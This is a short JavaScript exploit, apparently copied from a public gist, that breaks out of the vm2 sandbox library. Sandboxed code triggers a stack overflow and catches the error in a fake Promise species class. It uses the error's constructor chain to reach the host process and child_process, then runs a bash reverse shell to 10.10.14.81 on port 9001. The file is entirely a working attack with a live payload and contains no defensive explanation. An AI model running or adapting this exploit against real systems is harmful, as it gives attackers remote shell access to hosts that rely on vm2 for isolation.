/*
    https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9
*/
const {VM} = require("vm2");
const vm = new VM();

const code = `
async function fn() {
    (function stack() {
        new Error().stack;
        stack();
    })();
}
p = fn();
p.constructor = {
    [Symbol.species]: class FakePromise {
        constructor(executor) {
            executor(
                (x) => x,
                (err) => { return err.constructor.constructor('return process')().mainModule.require('child_process').execSync("bash -c 'bash -i >& /dev/tcp/10.10.14.81/9001 0>&1'"); }
            )
        }
    }
};
p.then();
`;

console.log(vm.run(code));